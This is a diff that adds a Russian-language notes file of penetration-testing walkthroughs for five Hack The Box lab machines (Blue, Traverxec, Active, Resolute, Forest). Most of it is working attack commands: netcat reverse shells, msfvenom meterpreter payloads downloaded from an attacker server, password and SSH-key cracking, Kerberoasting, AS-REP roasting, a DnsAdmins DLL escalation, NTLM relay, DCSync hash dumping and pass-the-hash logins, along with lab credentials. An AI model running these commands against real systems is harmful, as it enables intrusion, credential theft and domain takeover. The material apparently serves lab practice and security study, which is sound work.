@@ -1,0 +1,187 @@
+[blue]
+ms17_010_psexec
+post/windows/manage/enable_rdp				открыть доступ по rdp
+meterpreter> net user Administrator shaark
+$ xfreerdp /u:Administrator /p:shaark /v:10.10.10.40 	подключение по rdp с учетными данными
+
+
+
+
+
+[traverexec]
+
+Получаем reverse shell через уязвимость CVE-2019-26278
+
+exploit/multi/http/nostromo_code_exec
+https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE
+nc -e /bin/bash 10.10.10.2 4455	исполняемая команда
+
+
+Прокидываем meterpreter shell
+
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4455 -f bash -o shell
+python3 -m http.server 9090
+
+nc> wget http://10.10.10.2:9090/shell
+nc> ./shell
+
+
+Брутаем хеш пароля из бэкапа
+$ hashcat -a 0  -m 500 --force hash_htb1.txt ../rockyou.txt
+
+
+Нашли .ssh в бэкап файлах:
+Копируем id_rsa на локальную машину
+Взлом приватного сертификата через john:
+$ cd /usr/share/john								по дефолту на кали
+$ python ssh2john.py /tmp/it_rsa > /tmp/htb_john.hash
+$ john /tmp/htb_john.hash  -wordlist=/usr/share/wordlists/rockyou.txt 
+$ john --show /tmp/htb_john.hash						показать результат
+
+
+Подключаемся
+$ ssh -i id_rsa david@10.10.10.165
+	вводим сбрученый пароль сертификата
+	
+Повышаемся 
+https://gtfobins.github.io/gtfobins/journalctl/
+sudo journalctl
+!/bin/sh
+
+
+
+
+
+[active]
+
+Энумерация доступных smb рессурсов
+$ enum4linux -a 10.10.10.100
+$ smbmap -H 10.10.10.100
+
+$ smbclient //10.10.10.100/Replication		подключение к анонимной шаре Replication
+
+Рекурсивная загрузка файлов с шары через smbclient
+smb: \> mask ""
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> lcd /home/kali/Downloads
+smb: \> mget *
+
+
+Были обнаружены груповые политики, в файле Groups.xml были найдены учетные данные, зашифрованные стандартным ключом 
+GPP decode (расшифровка)
+$ gpp-decode <edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ>
+
+Сканируем с кредами
+$ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+
+Подключаемся с учетной записью
+$ smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18
+
+Kerberoasting через impacket
+$ ntpdate 10.10.10.100		синхронизация времени для атаки kerberoasting
+$ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+
+
+
+
+
+[Resolute]
+
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+$ nmap --script smb-vuln* -p 445 10.10.10.169		поиск уязвимостей smb
+$ nmap --script smb-os-discovery 10.10.10.169		информация про домен и машину
+
+1. энумерация пользователей в домене
+$ sudo nmap -sU  -sS --script=smb-enum-users -p139,445 10.10.10.169
+Наши коментарий с установленным паролем по умолчанию: Welcome123!
+
+2. Пробуем применить пароль ко всем учетным записям 
+msf6> use auxiliary/scanner/smb/smb_login
+msf6> set user_list HTB_Resolute_users.txt
+Нашли учетную запись melanie
+
+3. Сканируем доступные шары
+$ smbmap -H 10.10.10.169 -d MEGABANK -u melanie -p Welcome123!
+
+4. Подключаемся к шаре
+$ smbclient //10.10.10.169/SYSVOL -U melanie%Welcome123!
+
+5. Получаем Шелл через winrm (5985)
+evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
+
+6. Генерируем пейлоад и забрасываем через python server и wget 
+$ python -m http.server 9090
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4467 -f exe -o shell.exe
+PS C:\> wget "http://10.10.16.4:9090/shell/shell.exe" -outfile "shell.exe"
+
+6.1 Исследуем информацию о домене
+$ ldapdomaindump -u MEGABANK.LOCAL\\melanie -p Welcome123! 10.10.10.169
+Обнаруживаем, что пользователь ryan входит в группу Contractors, которая входит в группу DnsAdmins
+
+7. Исследуем файловую систему. Команда ls отображает не все. Вместо нее используем:
+PS C:\> Get-ChildItem -Force
+Находим пароль от аккаунта ryan
+
+8. Повышаем привилегии аккаунту melanie через DNS (https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+PS C:\> [Environment]::Is64BitOperatingSystem		проверка разрядности системы
+$ msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > ~/Desktop/HTB_Resolute/dns.dll	пейлоад, который добавит пользователя melanie в группу admins
+$ python3 smbserver.py -debug SHARE ~/Desktop/HTB_Resolute	поднимаем шару что бы подтянуть пейлоад
+
+9. Подключаемся как ryan и перезагружаем сервис dns
+$ evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
+PS C:\> dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.16.4\SHARE\dns.dll
+PS C:\> sc.exe stop dns
+PS C:\> sc.exe start dns
+Подключаемся от имени melanie и забираем флаг
+
+
+
+
+
+[Forest]
+
+1. Энумерация пользователей домена
+$ enum4linux -U 10.10.10.161		вывод только информации об аккаунтах
+
+2. Альтернативный способ (показывает отключенные учетки)
+$ impacket-samrdump 10.10.10.161 | grep AccountIsDisabled
+
+3. AS Rep Roasting по списку активных пользователей
+$ python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -no-pass -usersfile /home/kali/Desktop/HTB_Forest/users_cl.txt
+
+4. Брутим билет с помощью hashcat
+$ hashcat -a 0  -m 18200 --force hash_htb3.txt ../rockyou.txt
+
+5. Получаем шелл
+$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+6. сбор данных для Bloodhound 
+Загружаем collector SharpHound.exe через upload в evil-winrm. Запускаем сбор информации
+C:\> C:\\Users\svc-alfresco\Documents\SharpHound.exe  --CollectionMethod All --Domain htb.local --ldapusername "svc-alfresco" --ldappassword "s3rvice"
+Выгружаем полученный архив
+https://0xdf.gitlab.io/2018/11/10/htb-reel.html#bloodhound
+
+7. Анализ в BloodHound
+$ neo4j console		запускаем сервис и меняем пароль
+$ bloodhound			перетаскиваем в окно скачанный архив
+
+8. Нашли кратчайший путь до админа домена. Добавляемся в группу 
+C:/> net group "Exchange Windows Permissions" svc-alfresco /add /domain
+
+9. Добавляем пользователя
+C:\> New-ADUser -Name hacker -SamAccountName hacker -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) -Enabled $True
+C:\> net user hacker /domain
+C:\> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members hacker
+C:\> Get-ADUser -Identity hacker -Properties *
+
+10. Митм активности с целью поиска учеток, которые могу модифицировать доменные ACL, что бы добавить Replication-Get-Changes-All права к аккаунту пользователя hacker
+$ sudo ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user hacker
+Поскольку мы владеем этим аккаунтом - мы сами и авторизуемся по адресу http:<наш ip>/privexchange
+
+11. DCSync что бы сдампить хеш администратора
+$ secretsdump.py htb.local/hacker:Password1@10.10.10.161 
+
+12. Авторизация от имени админа 
+$ psexec.py htb.local/administrator@10.10.10.161 -hashes aad3...ceea6
+
